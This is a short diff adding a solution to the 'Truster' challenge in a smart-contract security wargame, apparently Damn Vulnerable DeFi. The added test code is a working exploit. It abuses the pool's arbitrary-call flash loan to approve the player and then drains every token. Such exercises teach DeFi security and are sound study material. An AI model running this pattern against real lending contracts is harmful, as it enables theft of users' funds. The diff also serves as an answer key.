@@ -23,6 +23,18 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        // Create a calldata to call `token.approve()` from the `pool` contract.
+        const ABI = ["function approve(address spender, uint256 amount)"]
+        const iface = new ethers.utils.Interface(ABI)
+        const calldata = iface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL])
+
+        // Request 0 tokens, so nothing needs to be paid back
+        await pool.connect(player).flashLoan(0, player.address, token.address, calldata)
+        expect(await token.allowance(pool.address, player.address)).to.equal(TOKENS_IN_POOL)
+
+        // Drain the pool after the approval
+        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL)
     });
 
     after(async function () {
